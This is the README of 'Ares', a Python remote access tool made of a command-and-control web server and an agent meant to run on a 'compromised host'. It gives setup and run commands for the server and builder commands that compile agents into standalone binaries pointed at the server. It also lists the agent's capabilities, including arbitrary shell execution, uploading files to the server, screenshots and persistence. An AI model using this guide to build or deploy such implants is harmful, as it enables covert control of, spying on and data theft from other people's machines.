# Ares

Ares is a Python Remote Access Tool.

__Warning: Only use this software according to your current legislation. Misuse of this software can raise legal and ethical issues which I don't support nor can be held responsible for.__

Ares is made of two main programs:

- A Command aNd Control server, which is a Web interface to administer the agents
- An agent program, which is run on the compromised host, and ensures communication with the CNC

The Web interface can be run on any server running Python3. The agent can be compiled to native executables using **pyinstaller**.

## Server

Install the Python requirements for the server:

```
cd server
pip3 install -r requirements.txt
```

Initialize the database:

```
python3 ares.py initdb
```

Run with the builtin (debug) server:

```
python3 ares.py runserver -h 0.0.0.0 -p 8080 --threaded
```

Or run using gunicorn:

```
# HTTP server
gunicorn

# HTTPS server using self-signed certificate (if no valid certificate available)
openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 1365
gunicorn  ares:app -b 0.0.0.0:8080 --threads 20 --certfile cert.pem --keyfile key.pem
```

The server should now be accessible on http(s)://localhost:8080

## Agent

Install the Python requirements for the agent:

```
cd agent
pip3 install -r requirements.txt
```

Run the Python agent (update config.py to suit your needs):

```
cd agent
python agent.py
```

### Building an agent

Windows agents are build on Windows and Linux agents are built on Linux.

Build a new agent to a standalone binary:

```
# Windows
python builder.py --server http://localhost:8080 -o agent.exe

# Linux
python3 builder.py --server http://localhost:8080 -o agent
``` 

### Supported agent commands

```
<any shell command>
Executes the command in a shell and return its output.

upload <local_file>
Uploads <local_file> to server.

download <url> <destination>
Downloads a file through HTTP(S).

zip <archive_name> <folder>
Creates a zip archive of the folder.

screenshot
Takes a screenshot.

persist
Installs the agent.

clean
Uninstalls the agent.

exit
Kills the agent.

help
This help.
```
